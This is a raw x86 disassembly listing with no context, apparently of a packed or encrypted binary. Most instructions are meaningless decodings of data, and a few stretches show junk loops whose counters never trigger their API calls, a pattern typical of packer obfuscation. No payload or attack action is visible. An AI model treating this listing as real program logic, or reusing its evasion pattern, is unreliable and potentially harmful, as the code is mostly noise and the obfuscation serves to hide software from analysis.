  405a45:	bound  eax,QWORD PTR [esp+edi*1+0x4aff90a2]
  405a4c:	cdq    
  405a4d:	jns    0x405a69
  405a4f:	push   edi
  405a50:	cwde   
  405a51:	sbb    eax,0x2d770353
  405a56:	inc    ebp
  405a57:	mov    ebx,0x48558821
  405a5c:	xchg   ecx,eax
  405a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a5e:	cmp    bl,BYTE PTR [esi]
  405a60:	mov    ecx,0x6675060f
  405a65:	jo     0x405a6c
  405a67:	pop    edx
  405a68:	jne    0x4059fa
  405a6a:	out    0x45,eax
  405a6c:	jns    0x405a58
  405a6e:	je     0x405a93
  405a70:	pop    esp
  405a71:	push   ds
  405a72:	sbb    al,0x2b
  405a74:	push   es
  405a75:	mov    bl,0x59
  405a77:	into   
  405a78:	mov    edx,0x532f3e47
  405a7d:	retf   0xba1a
  405a80:	or     DWORD PTR [ebx+0x33],esp
  405a83:	arpl   dx,bp
  405a85:	scas   eax,DWORD PTR es:[edi]
  405a86:	mov    ah,0x87
  405a88:	shl    cl,1
  405a8a:	xchg   BYTE PTR [ecx-0x588a7d03],bl
  405a90:	dec    ecx
  405a91:	leave  
  405a92:	pop    ecx
  405a93:	mov    bl,0xcf
  405a95:	or     dl,cl
  405a97:	lea    esp,[ebx+0x1a]
  405a9a:	call   0xd5d6:0x5d88158
  405aa1:	fidiv  DWORD PTR [esi+ecx*8+0x604cf904]
  405aa8:	inc    ebp
  405aa9:	(bad)  
  405aab:	into   
  405aac:	jecxz  0x405aad
  405aae:	in     al,0x49
  405ab0:	imul   ebp,esi,0x6c
  405ab3:	jo     0x405a85
  405ab5:	js     0x405a76
  405ab7:	sbb    eax,0xfa652f66
  405abc:	adc    edi,DWORD PTR [edx-0x679924bc]
  405ac2:	dec    esi
  405ac3:	jae    0x405b0b
  405ac5:	add    ch,cl
  405ac7:	data16 or al,0xfb
  405aca:	cmp    al,0xbf
  405acc:	xor    eax,0x55bc8515
  405ad1:	push   esp
  405ad2:	fidivr WORD PTR [eax+0x6]
  405ad5:	cmp    al,0xd1
  405ad7:	scas   al,BYTE PTR es:[edi]
  405ad8:	adc    al,0x8e
  405ada:	inc    ebp
  405adb:	xadd   BYTE PTR [eax-0x2a],ah
  405adf:	icebp  
  405ae0:	fs add eax,0xa5f59a8a
  405ae6:	icebp  
  405ae7:	jmp    0x8c7:0x44a3950a
  405aee:	mov    al,0x9d
  405af0:	stos   BYTE PTR es:[edi],al
  405af1:	fcmove st,st(0)
  405af3:	jmp    0xc02419f1
  405af8:	retf   
  405af9:	mov    dh,0x69
  405afb:	jge    0x405b6b
  405afd:	mov    eax,ds:0x14ff7e60
  405b02:	dec    ebp
  405b03:	mov    DWORD PTR [esi+0x2a439faa],esi
  405b09:	stc    
  405b0a:	nop    DWORD PTR [eax+esi*8]
  405b0e:	inc    eax
  405b0f:	mov    cl,0x6a
  405b11:	sar    BYTE PTR [esi],cl
  405b13:	test   BYTE PTR [ebx],0xf9
  405b16:	imul   ebp,DWORD PTR [edi+0x5],0xffffffeb
  405b1a:	jmp    0xcc50b1a4
  405b1f:	pop    fs
  405b21:	gs dec ecx
  405b23:	jb     0x405b3c
  405b25:	mov    ecx,0x10dc1084
  405b2a:	retf   0xd56f
  405b2d:	pop    esi
  405b2e:	jl     0x405baf
  405b30:	nop
  405b31:	repz adc ecx,esp
  405b34:	mov    ds:0x5985c6c2,eax
  405b39:	push   ecx
  405b3a:	jb     0x405b75
  405b3c:	sub    esp,DWORD PTR [ebx-0x148f3df0]
  405b42:	xchg   ebp,eax
  405b43:	retf   
  405b44:	stos   BYTE PTR es:[edi],al
  405b45:	sub    eax,0x81455219
  405b4a:	mov    al,0xf5
  405b4c:	in     al,dx
  405b4d:	xor    al,bl
  405b4f:	mov    ecx,0x8f4de510
  405b54:	jo     0x405b3d
  405b56:	sub    eax,0xf6cef105
  405b5b:	and    ah,BYTE PTR [esi+0x1d6300a8]
  405b61:	lds    ebp,FWORD PTR [ebp+ebp*1-0x154a3e22]
  405b68:	jbe    0x405bbb
  405b6a:	cmp    eax,0x1f38084c
  405b6f:	lds    edi,FWORD PTR [esi]
  405b71:	push   edx
  405b72:	stos   BYTE PTR es:[edi],al
  405b73:	fld    TBYTE PTR [esi-0x4e8de145]
  405b79:	dec    edi
  405b7a:	xchg   ebx,eax
  405b7b:	call   0x10c3:0xebff4a9
  405b82:	jecxz  0x405b27
  405b84:	ror    DWORD PTR ds:0xe6e3827,cl
  405b8a:	adc    DWORD PTR [edx+0x12],0xffffff8c
  405b8e:	repnz adc al,0xd6
  405b91:	xchg   edi,esp
  405b93:	mov    ebx,db2
  405b96:	mov    ch,0x2e
  405b98:	shr    DWORD PTR [esi],cl
  405b9a:	add    al,0xe3
  405b9c:	mov    bl,0x8f
  405b9e:	push   edi
  405b9f:	mov    bh,0x5b
  405ba1:	(bad)  
  405ba2:	jmp    0xe53f:0x87c5da09
  405ba9:	mov    al,ds:0x783286e3
  405bae:	loop   0x405c27
  405bb0:	add    al,0xc8
  405bb2:	add    DWORD PTR [edx],eax
  405bb4:	pop    ecx
  405bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb6:	out    dx,eax
  405bb7:	addr16 mov al,ds:0xab63
  405bbb:	xchg   esi,eax
  405bbc:	fdivr  QWORD PTR [eax-0x6960ba24]
  405bc2:	jno    0x405b71
  405bc4:	pop    esi
  405bc5:	ret    
  405bc6:	scas   al,BYTE PTR es:[edi]
  405bc7:	xor    eax,0x2b8dc61b
  405bcc:	jnp    0x405c1b
  405bce:	sub    edx,edi
  405bd0:	inc    esp
  405bd1:	push   ebx
  405bd2:	push   edx
  405bd3:	xor    BYTE PTR ds:0xe71a8c64,cl
  405bd9:	data16 xor bh,BYTE PTR [ebp+0xe]
  405bdd:	add    ch,BYTE PTR es:[bp+si]
  405be1:	je     0x405c19
  405be3:	pushf  
  405be4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  405be6:	pop    edx
  405be7:	or     ch,BYTE PTR [eax+0x5b]
  405bea:	out    dx,al
  405beb:	or     DWORD PTR [ebp-0x7c875ff6],edi
  405bf1:	mov    BYTE PTR [edx-0x36],cl
  405bf4:	or     ah,BYTE PTR [edi+0x720fc927]
  405bfa:	add    al,BYTE PTR [eax+edx*8]
  405bfd:	sbb    eax,0x11e28bd6
  405c02:	lods   al,BYTE PTR ds:[esi]
  405c03:	xlat   BYTE PTR ds:[ebx]
  405c04:	(bad)  
  405c05:	out    0xd9,eax
  405c07:	lahf   
  405c08:	or     cl,ch
  405c0a:	(bad)  
  405c0b:	fbstp  TBYTE PTR [esi+0x54]
  405c0e:	cmp    BYTE PTR [edx],ch
  405c10:	sahf   
  405c11:	pusha  
  405c12:	iret   
  405c13:	call   0x6bb32415
  405c18:	daa    
  405c19:	dec    esp
  405c1a:	lea    ebx,[edx-0x3f6c84ab]
  405c20:	mov    esi,0x29f3616d
  405c25:	xor    eax,0x5aec97d6
  405c2a:	jo     0x405c81
  405c2c:	fld    DWORD PTR [ebp+0x79956c90]
  405c32:	sub    BYTE PTR [esi+0x2b],al
  405c35:	inc    ebx
  405c36:	push   ds
  405c37:	in     al,0x5c
  405c39:	fdiv   DWORD PTR fs:0xf9578e3b
  405c40:	stos   BYTE PTR es:[edi],al
  405c41:	mov    cl,0x8
  405c43:	aad    0x9
  405c45:	dec    ecx
  405c46:	lock cmp DWORD PTR [esi+eiz*2],edx
  405c4a:	pop    edi
  405c4b:	aam    0xcd
  405c4d:	sbb    BYTE PTR [edi],al
  405c4f:	dec    ebx
  405c50:	and    al,0x6f
  405c52:	xor    al,0xb7
  405c54:	outs   dx,DWORD PTR ds:[esi]
  405c55:	sub    eax,0x2765eb59
  405c5a:	jp     0x405c71
  405c5c:	add    al,0x83
  405c5e:	icebp  
  405c5f:	ret    
  405c60:	push   ss
  405c61:	add    al,BYTE PTR [edx]
  405c63:	imul   DWORD PTR [esi-0x6aaaada6]
  405c69:	dec    ecx
  405c6a:	lods   al,BYTE PTR ds:[esi]
  405c6b:	dec    si
  405c6d:	pop    esi
  405c6e:	push   ebp
  405c6f:	popf   
  405c70:	pop    es
  405c71:	je     0x405c45
  405c73:	mov    al,cs:0x402a2dec
  405c79:	icebp  
  405c7a:	and    eax,0xd5553d68
  405c7f:	xor    eax,eax
  405c81:	lock fimul DWORD PTR [edx]
  405c84:	push   DWORD PTR [ecx+0x1efc9728]
  405c8a:	xchg   esi,eax
  405c8b:	jne    0x405c30
  405c8d:	mov    eax,ds:0xf3759693
  405c92:	and    al,BYTE PTR [eax+ecx*8+0x29]
  405c96:	aam    0x56
  405c98:	and    al,dh
  405c9a:	outs   dx,BYTE PTR ds:[esi]
  405c9b:	xchg   DWORD PTR ds:0x9eb81fa7,ebx
  405ca1:	cmc    
  405ca2:	dec    esi
  405ca3:	adc    esp,DWORD PTR [ebx]
  405ca5:	or     ebx,esi
  405ca7:	retf   
  405ca8:	popa   
  405ca9:	mov    cl,0x56
  405cab:	leave  
  405cac:	(bad)  
  405cad:	nop
  405cae:	cmp    DWORD PTR [ebp-0x1a],edi
  405cb1:	pop    edx
  405cb2:	loope  0x405cd9
  405cb4:	iret   
  405cb5:	jb     0x405c61
  405cb7:	cmp    bh,BYTE PTR [edx]
  405cb9:	add    eax,0xfb8de312
  405cbe:	fdivr  st,st(0)
  405cc0:	push   ebp
  405cc1:	add    DWORD PTR [esi],esi
  405cc3:	test   eax,0x54d9feec
  405cc8:	sbb    eax,0x850fc83b
  405ccd:	adc    al,BYTE PTR [eax+eax*1]
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x43463f
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434653,0x43467b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43470f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4346c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434647,0x12
  405d19:	cmp    DWORD PTR ds:0x434647,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434647,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434647
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434647,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0xce3e1bd6
  405d8d:	bsr    esi,DWORD PTR [ebp-0x3b8181c4]
  405d94:	jns    0x405e14
  405d96:	jle    0x405dbf
  405d98:	jp     0x405e08
  405d9a:	push   DWORD PTR [edi]
  405d9c:	outs   dx,DWORD PTR ds:[esi]
  405d9d:	int3   
  405d9e:	sub    esp,DWORD PTR ds:0xab338c2a
  405da4:	nop
  405da5:	ror    eax,cl
  405da7:	jg     0x405dfb
  405da9:	clc    
  405daa:	or     al,0x96
  405dac:	(bad)  [ebx+0x42]
  405daf:	retf   0x8760
  405db2:	imul   edx,DWORD PTR [edx+0x201397bd],0xffffffd3
  405db9:	aaa    
  405dba:	mov    edi,0xa83a0655
  405dbf:	xchg   esp,eax
  405dc0:	or     BYTE PTR [esi-0x4017c121],bl
  405dc6:	pop    esi
  405dc7:	lods   eax,DWORD PTR ds:[esi]
  405dc8:	cmp    dh,BYTE PTR [edx]
  405dca:	mov    eax,0xa0c35e34
  405dcf:	retf   
  405dd0:	or     ecx,DWORD PTR [ebp+0x31]
  405dd3:	cld    
  405dd4:	mov    ch,0x57
  405dd6:	pop    es
  405dd7:	or     BYTE PTR [eax],dh
  405dd9:	mov    ah,0x36
  405ddb:	dec    ecx
  405ddc:	in     eax,dx
  405ddd:	dec    edi
  405dde:	push   0xd51d7d46
  405de3:	or     ebp,DWORD PTR [ebx]
  405de5:	xchg   ebx,eax
  405de6:	and    al,0x7d
  405de8:	outs   dx,DWORD PTR ds:[esi]
  405de9:	in     al,0x93
  405deb:	dec    BYTE PTR [eax]
  405ded:	ja     0x405d91
  405def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df0:	add    ah,ah
  405df2:	xchg   esp,eax
  405df3:	jno    0x405e28
  405df5:	inc    edi
  405df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405df7:	int3   
  405df8:	leave  
  405df9:	ins    BYTE PTR es:[edi],dx
  405dfa:	ret    
  405dfb:	xchg   esi,eax
  405dfc:	inc    edi
  405dfd:	fnsave [edx+0x5c306cf]
  405e03:	pop    ds
  405e04:	xchg   bl,cl
  405e06:	cmc    
  405e07:	dec    edi
  405e08:	(bad)  
  405e0a:	aaa    
  405e0b:	mov    ebx,0xf54ebab
  405e10:	shl    BYTE PTR [esi],1
  405e12:	test   DWORD PTR [esi+0x99c6981],eax
  405e18:	pop    edi
  405e19:	test   al,0xc5
  405e1b:	xor    al,0x61
  405e1d:	fisub  WORD PTR [esi+edx*8-0x54c9a3d6]
  405e24:	inc    edx
  405e25:	jnp    0x405e67
  405e27:	dec    ebp
  405e28:	push   esi
  405e29:	sub    eax,0x59f7569a
  405e2e:	retf   
  405e2f:	mov    al,0x20
  405e31:	pop    ebp
  405e32:	cli    
  405e33:	iret   
  405e34:	int    0xf
  405e36:	femms  
  405e38:	jge    0x405e3d
  405e3a:	data16 int3 
  405e3c:	loopne 0x405e88
  405e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3f:	ds mov eax,0x83f39121
  405e45:	xchg   BYTE PTR [ebp-0x7c1f2b11],dh
  405e4b:	out    0xcc,al
  405e4d:	dec    edi
  405e4e:	mov    eax,0xcebaffc7
  405e53:	inc    esi
  405e54:	fidiv  WORD PTR [ebx]
  405e56:	jecxz  0x405df0
  405e58:	lock loop 0x405e57
  405e5b:	mov    ch,0xb1
  405e5d:	jnp    0x405e28
  405e5f:	mov    bl,BYTE PTR [edi-0x74]
  405e62:	test   al,0x4d
  405e64:	daa    
  405e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e66:	and    al,0x52
  405e68:	xor    edi,DWORD PTR [ebx+0x368262ad]
  405e6e:	popa   
  405e6f:	js     0x405e84
  405e71:	jmp    0x405ede
  405e73:	pop    ebx
  405e74:	int    0xc1
  405e76:	xor    eax,0xc6b9d479
  405e7b:	mov    dh,0x42
  405e7d:	test   DWORD PTR [ecx-0x18841ed3],ecx
  405e83:	adc    ah,dh
  405e85:	push   cs
  405e86:	rcl    DWORD PTR [edx+ebx*2-0x1721caad],cl
  405e8d:	hlt    
  405e8e:	sub    DWORD PTR [ebp-0x4b],0xffffffd2
  405e92:	and    DWORD PTR [ebp+0x60],ecx
  405e95:	xor    DWORD PTR [esi-0x11],ecx
  405e98:	xor    al,0xaf
  405e9a:	jge    0x405e22
  405e9c:	test   al,0xf8
  405e9e:	xchg   ebp,eax
  405e9f:	sar    BYTE PTR [edx-0x790a395a],cl
  405ea5:	lods   al,BYTE PTR ds:[esi]
  405ea6:	cmp    ecx,DWORD PTR [eax-0x48d2d716]
  405eac:	jb     0x405e7b
  405eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eaf:	lods   eax,DWORD PTR ds:[esi]
  405eb0:	imul   ebx,DWORD PTR [edi-0x4c5a5d9b],0x6e
  405eb7:	sub    eax,0x9c8444df
  405ebc:	add    bl,ah
  405ebe:	scas   al,BYTE PTR es:[edi]
  405ebf:	retf   
  405ec0:	ja     0x405e65
  405ec2:	test   eax,0xdb343eae
  405ec7:	loope  0x405e4b
  405ec9:	xor    cl,BYTE PTR [edx*4+0xc429789]
  405ed0:	fdivp  st(5),st
  405ed2:	jp     0x405f40
  405ed4:	lahf   
  405ed5:	push   es
  405ed6:	mov    ebp,0xf46120d7
  405edb:	arpl   WORD PTR [eax+0x4f],ax
  405ede:	sub    DWORD PTR [edx],ebp
  405ee0:	je     0x405ed3
  405ee2:	cmp    esp,DWORD PTR [edi]
  405ee4:	in     eax,0xe9
  405ee6:	out    dx,eax
  405ee7:	push   esp
  405ee8:	and    al,0xc
  405eea:	and    al,0x81
  405eec:	nop
  405eed:	adc    DWORD PTR [esi],ebx
  405eef:	cmp    eax,0xc38d8f66
  405ef4:	sbb    BYTE PTR [ebx+edx*8-0x76fd70b4],0x49
  405efc:	(bad)
  405f01:	ret    0xb668
  405f04:	cmp    DWORD PTR [ebx+0x6f490682],ecx
  405f0a:	jb     0x405f35
  405f0c:	and    DWORD PTR [ecx-0x227c2fb2],esp
  405f12:	fidiv  WORD PTR [ebx-0x5dfa69de]
  405f18:	outs   dx,DWORD PTR ds:[esi]
  405f19:	idiv   DWORD PTR ds:0xcf2fefaf
  405f1f:	and    DWORD PTR [edi+ecx*8+0x4328ad34],eax
  405f26:	mov    ebx,0xb97a3de2
  405f2b:	mov    dl,0xea
  405f2d:	fsubp  st(7),st
  405f2f:	adc    ebp,ebx
  405f31:	push   0xeb7382d2
  405f36:	cld    
  405f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f38:	and    al,ah
  405f3a:	sbb    eax,edi
  405f3c:	in     al,dx
  405f3d:	dec    ebp
  405f3e:	inc    edx
  405f3f:	add    BYTE PTR [edx-0x33],ch
  405f42:	or     eax,0xf777487e
  405f47:	fiadd  WORD PTR [eax+edi*1+0x2713d7bb]
  405f4e:	mov    esp,ds
  405f50:	ret    
  405f51:	sbb    bl,BYTE PTR [esi]
  405f53:	cdq    
  405f54:	push   esi
  405f55:	(bad)
  405f59:	cmp    eax,0x6205d8ee
  405f5e:	and    ch,ah
  405f60:	or     BYTE PTR [esi-0x55],ch
  405f63:	fst    QWORD PTR [edi-0x1a]
  405f66:	hlt    
  405f67:	adc    edi,DWORD PTR [esi]
  405f69:	cmp    eax,0x9de61e1
  405f6e:	dec    ebx
  405f6f:	sahf   
  405f70:	sub    eax,0x154f217d
  405f75:	daa    
  405f76:	mov    bl,BYTE PTR [ecx]
  405f78:	sub    edi,esp
  405f7a:	xor    ebx,ebp
  405f7c:	mov    bl,0x5d
  405f7e:	mov    bl,0x29
  405f80:	mov    WORD PTR [eax-0x3d2e68fc],gs
  405f86:	daa    
  405f87:	(bad)  [edi*8-0x5e8b9466]
  405f8e:	loope  0x405f60
  405f90:	adc    ch,ch
  405f92:	(bad)  
  405f93:	clc    
  405f94:	push   ecx
  405f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f96:	ds aas 
  405f98:	and    DWORD PTR [eax-0x64],0xffffffd5
  405f9c:	dec    eax
  405f9d:	add    eax,0x79dddea0
  405fa2:	push   es
  405fa3:	push   edx
  405fa4:	pmuludq mm2,mm2
  405fa7:	aad    0x5f
  405fa9:	fs jecxz 0x405f74
  405fac:	les    eax,FWORD PTR [ecx-0x3d108093]
  405fb2:	adc    ebp,DWORD PTR [edx]
  405fb4:	pop    ecx
  405fb5:	cmp    DWORD PTR [ebx+0x6a],ebp
  405fb8:	mov    ds:0x4bc0c0a3,eax
  405fbd:	mov    ebp,0x45eac98f
  405fc2:	neg    ebp
  405fc4:	ror    DWORD PTR [ebx+0x53],0xb5
  405fc8:	not    DWORD PTR [edx-0x1b]
  405fcb:	test   al,0xd2
  405fcd:	enter  0x987f,0xe5
  405fd1:	out    0xc0,al
  405fd3:	pop    ds
  405fd4:	iret   
  405fd5:	adc    BYTE PTR [edi],cl
  405fd7:	or     bl,cl
  405fd9:	jb     0x406047
  405fdb:	mov    al,0xef
  405fdd:	mov    dh,0x35
  405fdf:	xor    BYTE PTR [ebp+0x72],al
  405fe2:	add    dh,BYTE PTR [ebp+0x4d]
  405fe5:	xchg   edx,eax
  405fe6:	sub    eax,DWORD PTR [eax]
  405fe8:	jmp    0x52a28314
  405fed:	mov    BYTE PTR [edi],0xec
  405ff0:	push   eax
  405ff1:	mov    edx,0x8bbf29b
  405ff6:	(bad)
  405ff9:	ins    BYTE PTR es:[edi],dx
  405ffa:	mov    cl,BYTE PTR [ecx+edi*2]
  405ffd:	jl     0x406068
  405fff:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  406001:	rcr    al,cl
  406003:	jb     0x405faf
  406005:	sub    BYTE PTR [ebx+0xa],cl
  406008:	sti    
  406009:	mov    esp,DWORD PTR [ebp+0x69]
  40600c:	push   ds
  40600d:	add    esp,ebp
  40600f:	cld    
  406010:	lds    edi,FWORD PTR [edi+0x79]
  406013:	mov    ss,WORD PTR [ebx+0x6a090cd3]
  406019:	xor    BYTE PTR [ebp+0x61303805],0xda
  406020:	adc    al,0xcc
  406022:	lea    eax,[esi+ebx*8+0x42faf7c8]
  406029:	adc    edx,ebx
  40602b:	nop
  40602c:	lock loopne 0x405fd7
  40602f:	aam    0xa7
  406031:	sbb    al,0xd3
  406033:	test   dl,0x26
  406036:	dec    eax
  406037:	bnd jnp 0x406095
  40603a:	daa    
  40603b:	adc    ecx,esi
  40603d:	mov    ?,WORD PTR [eax-0x58]
  406040:	mov    ah,0x2f
  406042:	mov    al,0xdb
  406044:	scas   al,BYTE PTR es:[edi]
  406045:	and    edx,esi
  406047:	add    dh,BYTE PTR [edx]
  406049:	xor    eax,0x836de1f3
  40604e:	leave  
  40604f:	xchg   BYTE PTR [ebx+0x30],cl
  406052:	in     eax,dx
  406053:	jno    0x406066
  406055:	ins    BYTE PTR es:[edi],dx
  406056:	nop
  406057:	inc    ebx
  406058:	popa   
  406059:	hlt    
  40605a:	stc    
  40605b:	xchg   ebx,eax
  40605c:	call   0x671a7889
  406061:	ret    
  406062:	sbb    DWORD PTR [edx],ebp
  406064:	inc    ecx
  406065:	mov    esp,0x9aabdc27
  40606a:	loop   0x406028
  40606c:	mov    ah,BYTE PTR [esi]
  40606e:	fcomp  DWORD PTR [esi]
  406070:	pop    edx
  406071:	call   0x5382:0x6c0913b7
  406078:	inc    ebp
  406079:	push   es
  40607a:	xor    esp,ecx
  40607c:	retf   0xf452
  40607f:	aam    0x24
  406081:	fmul   QWORD PTR [ebp+0x7]
  406084:	scas   al,BYTE PTR es:[edi]
  406085:	outs   dx,DWORD PTR ds:[esi]
  406086:	cmc    
  406087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406088:	xor    bh,BYTE PTR [edi+0x5e159793]
  40608e:	repz mov al,0xd
  406091:	aas    
  406092:	push   es
  406093:	das    
  406094:	mov    eax,0xfd91326e
  406099:	out    dx,eax
  40609a:	pop    ecx
  40609b:	adc    BYTE PTR [ecx-0x1],bh
  40609e:	repnz fcmovnu st,st(6)
  4060a1:	lahf   
  4060a2:	mov    edx,0x8c2ea7e5
  4060a7:	js     0x406090
  4060a9:	and    eax,0x92ce9ca5
  4060ae:	and    eax,0x86ff2ef4
  4060b3:	sub    BYTE PTR [edx+0x4d30175e],0x83
  4060ba:	jg     0x406077
  4060bc:	cmp    eax,0xf5f19fe7
  4060c1:	adc    DWORD PTR [ebp+0x146b4302],edi
  4060c7:	push   ds
  4060c8:	fdivr  DWORD PTR [ebp+0x6c3b98f1]
  4060ce:	sub    bh,cl
  4060d0:	mov    eax,ds:0x1319ce93
  4060d5:	fistp  DWORD PTR [edx]
  4060d7:	adc    ebx,esp
  4060d9:	xchg   ecx,eax
  4060da:	fadd   QWORD PTR [edi+edx*2]
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43466f
  406101:	mov    eax,ds:0x43471b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434653,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434653
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434653,ecx
  40612c:	cmp    DWORD PTR ds:0x434653,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434653,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434637,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43467b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43467b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43467b,ecx
  406175:	cmp    DWORD PTR ds:0x43467b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43467b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43467b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43467b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43467b,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	shl    DWORD PTR [ebx+0x3f730979],cl
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x4061a1
  4061d2:	arpl   WORD PTR [eax+ebx*1-0x56],di
  4061d6:	push   ebx
  4061d7:	mov    al,0x73
  4061d9:	repz xchg ebx,eax
  4061db:	out    dx,eax
  4061dc:	xchg   ebx,esp
  4061de:	repz jmp 0x40620f
  4061e1:	nop
  4061e2:	mov    eax,ds:0xb6f4af27
  4061e7:	sub    eax,0x923e4f16
  4061ec:	and    ebx,edi
  4061ee:	scas   eax,DWORD PTR es:[edi]
  4061ef:	scas   al,BYTE PTR es:[edi]
  4061f0:	stos   DWORD PTR es:[edi],eax
  4061f1:	cmc    
  4061f2:	push   ebp
  4061f3:	adc    DWORD PTR [edi+0x3d],ebx
  4061f6:	out    0x87,eax
  4061f8:	dec    ecx
  4061f9:	test   eax,0x47c9c234
  4061fe:	into   
  4061ff:	and    edi,DWORD PTR [ecx+0x4c]
  406202:	lods   eax,DWORD PTR ds:[esi]
  406203:	and    dl,dl
  406205:	mov    al,ds:0x3e0b3cc9
  40620a:	lock cmp eax,0x13928d69
  406210:	in     al,0xe0
  406212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406213:	dec    edx
  406214:	sub    esp,0x866ef32a
  40621a:	ret    
  40621b:	xchg   BYTE PTR [edx-0x5a28c738],cl
  406221:	in     al,0x8c
  406223:	jae    0x40629a
  406225:	shl    BYTE PTR [ecx+esi*4+0x24],1
  406229:	fs mov al,0x31
  40622c:	add    bl,bl
  40622e:	inc    BYTE PTR [edx+0x4b4d792e]
  406234:	sar    DWORD PTR [ebx-0x5f80c3c6],0xca
  40623b:	pop    ebx
  40623c:	jmp    0x4061c2
  40623e:	fwait
  40623f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406240:	adc    al,0xef
  406242:	or     BYTE PTR [edi-0x3cb8d4bc],dh
  406248:	cmp    DWORD PTR [ebx+0x7e],0xffffffa3
  40624c:	into   
  40624d:	clc    
  40624e:	inc    ebp
  40624f:	movups XMMWORD PTR [ebx+edi*4-0x15],xmm5
  406254:	adc    BYTE PTR [ebp+0x115b8890],bh
  40625a:	call   0xf4e0aa31
  40625f:	dec    ecx
  406260:	shr    BYTE PTR [eax+0x1596f71b],0xbf
  406267:	xor    WORD PTR [ebx],bp
  40626a:	xor    bh,BYTE PTR [esi-0x581dbac5]
  406270:	aas    
  406271:	or     al,0xcf
  406273:	hlt    
  406274:	out    dx,eax
  406275:	rcl    BYTE PTR [eax*4+0x2079e522],1
  40627c:	mov    bh,0x7
  40627e:	outs   dx,DWORD PTR ds:[esi]
  40627f:	test   al,0xd8
  406281:	push   0x58fd2831
  406286:	push   esp
  406287:	or     ebp,DWORD PTR [ecx]
  406289:	aas    
  40628a:	repnz pop edx
  40628c:	pop    esi
  40628d:	lds    ecx,FWORD PTR [edi+ebx*1]
  406290:	push   esp
  406291:	call   0xa22c:0xa6d23698
  406298:	jmp    0x406300
  40629a:	mov    esp,0x253c2826
  40629f:	dec    ebx
  4062a0:	cmp    DWORD PTR [esi+0x61],0xffffffd5
  4062a4:	and    eax,0x507e896
  4062a9:	pop    ecx
  4062aa:	mov    bh,0xab
  4062ac:	xor    bl,dl
  4062ae:	xor    DWORD PTR [eax],ebx
  4062b0:	enter  0x2ff1,0x5c
